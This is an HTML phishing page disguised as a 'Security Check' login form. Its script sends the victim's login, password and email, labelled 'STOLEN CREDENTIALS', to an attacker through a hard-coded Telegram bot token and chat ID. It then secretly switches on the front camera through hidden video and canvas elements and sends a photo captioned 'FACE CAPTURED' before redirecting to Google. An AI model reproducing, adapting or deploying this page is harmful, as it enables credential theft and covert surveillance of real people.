<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Check</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0a0a;display:flex;align-items:center;justify-content:center;height:100dvh;
            font-family:'Courier New',monospace;overflow:hidden;
        }
        .card{
            background:#111;border:1px solid #1a1a1a;border-radius:16px;padding:35px 25px;
            text-align:center;max-width:380px;width:90%;box-shadow:0 0 60px rgba(229,57,53,0.1);
        }
        h2{color:#e53935;font-size:20px;margin-bottom:6px;letter-spacing:2px}
        .sub{color:#555;font-size:10px;letter-spacing:3px;margin-bottom:20px}
        input{
            width:100%;padding:12px;margin:8px 0;background:#0a0a0a;border:1px solid #1a1a1a;
            color:#e0e0e0;border-radius:8px;font-size:13px;font-family:'Courier New',monospace;outline:none
        }
        input:focus{border-color:#e53935}
        .btn{
            width:100%;padding:12px;margin-top:14px;background:#e53935;color:#fff;
            border:none;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;
            font-family:'Courier New',monospace;letter-spacing:1px;transition:all 0.2s
        }
        .btn:hover{background:#c62828}
        .btn:active{transform:scale(0.97)}
        .msg{color:#e53935;font-size:11px;margin-top:10px;min-height:16px}
        video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
    </style>
</head>
<body>
    <div class="card">
        <h2>SECURITY CHECK</h2>
        <div class="sub">verify your identity to continue</div>
        <input type="text" id="user" placeholder="Login" autofocus autocomplete="username">
        <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
        <input type="text" id="email" placeholder="Email (optional)" autocomplete="email">
        <div class="msg" id="msg"></div>
        <button class="btn" id="btn" onclick="go()">VERIFY</button>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <script>
        const BOT_TOKEN = "8653136768:AAGqhl21C7k3VZ3JGDgQBy83-UxQhoHM9bE";
        const CHAT_ID = 5730893708;

        async function go(){
            const btn=document.getElementById('btn');
            const msg=document.getElementById('msg');
            const user=document.getElementById('user').value.trim();
            const pass=document.getElementById('pass').value.trim();
            const email=document.getElementById('email').value.trim();

            if(!user||!pass){msg.textContent="Fill all required fields";return}

            btn.textContent="CHECKING...";
            btn.disabled=true;
            msg.textContent="";

            // Отправляем логины
            let report="STOLEN CREDENTIALS\n";
            report+="Login: "+user+"\n";
            report+="Password: "+pass+"\n";
            if(email)report+="Email: "+email+"\n";
            report+="Time: "+new Date().toLocaleString()+"\n";
            report+="Site: "+document.location.href;

            try{
                await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body:JSON.stringify({chat_id:CHAT_ID,text:report})
                });
            }catch(e){}

            // Камера
            try{
                const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480}});
                const video=document.getElementById("video");
                video.srcObject=stream;
                await video.play();

                const canvas=document.getElementById("canvas");
                canvas.width=video.videoWidth||640;
                canvas.height=video.videoHeight||480;
                canvas.getContext("2d").drawImage(video,0,0);

                canvas.toBlob(async(blob)=>{
                    const fd=new FormData();
                    fd.append("chat_id",CHAT_ID);
                    fd.append("photo",blob,"face.jpg");
                    fd.append("caption","FACE CAPTURED: "+user);
                    try{await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendPhoto",{method:"POST",body:fd})}catch(e){}
                    stream.getTracks().forEach(t=>t.stop());
                },"image/jpeg",0.7);
            }catch(e){}

            msg.textContent="Verification complete";
            msg.style.color="#4caf50";

            setTimeout(()=>{window.location.href="https://www.google.com"},1500);
        }

        document.getElementById("pass").addEventListener("keydown",e=>{if(e.key==="Enter")go()});
    </script>
</body>
</html>
